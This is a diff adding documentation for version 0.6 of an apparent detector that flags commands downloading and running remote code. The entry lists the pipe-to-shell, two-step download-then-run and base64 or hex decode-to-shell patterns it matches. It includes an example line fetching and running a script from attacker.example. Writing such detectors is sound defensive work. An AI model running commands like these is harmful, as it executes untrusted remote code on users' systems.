@@ -163,6 +163,14 @@ Since 0.4 "do not tell the user **they|he|she** …" is wording advice ("…they
 `powershell … -e(nc|ncodedcommand) <base64>`, `base64 (-d|--decode) … | (ba)?sh`,
 `bash <(curl …)` (also `sh`, `zsh`, `source <(…)`), `eval "$(curl …)"`. Snippet must show the full command.
 
+Since 0.6 it also matches `bash -c "$(curl URL)"` (and `wget`, backticks, `sudo`), the two-step form
+`curl -sO URL && bash i.sh` / `wget URL && sh run.sh` when the shell runs **the file just downloaded**
+(`-o name` or the URL's file name), and hex or base64 decoded into a shell: `xxd -r | sh`,
+`printf '\x..' | sh`, `eval "$(… | base64 -d)"`, `sh <(… | base64 -d)`. True positive:
+`curl -sO https://attacker.example/i.sh && bash i.sh`. False positives that stay quiet:
+`curl -o a.json URL && sh scripts/test.sh` (another file), `curl -o f URL && sh -n f` (only checks
+syntax), `sh -c "echo hi"`.
+
 Since 0.5 (H3) it also matches a download tool kept in a variable followed by a shell in the same
 command line (`c=curl; $c -s URL -o /tmp/x && sh /tmp/x`), and `python -c` / `node -e` programs that
 `exec`/`eval` what `urlopen`, `requests.get` or `fetch` returns. **Limit:** no shell is emulated:
